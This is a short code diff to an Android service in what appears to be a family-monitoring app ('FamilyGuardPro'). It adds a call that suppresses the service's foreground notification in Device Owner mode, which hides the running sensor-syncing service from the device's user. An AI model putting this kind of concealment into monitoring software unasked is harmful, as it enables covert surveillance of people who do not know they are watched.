@@ -182,6 +182,11 @@ class WebSocketSyncService : Service(), SensorEventListener {
         // Show foreground notification IMMEDIATELY
         startForeground(NOTIFICATION_ID, createNotification())
         
+        // Suppress notification in Device Owner mode
+        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
+            this, NOTIFICATION_ID
+        )
+        
         // Register screen state receiver (for adaptive intervals)
         registerScreenStateReceiver()
         
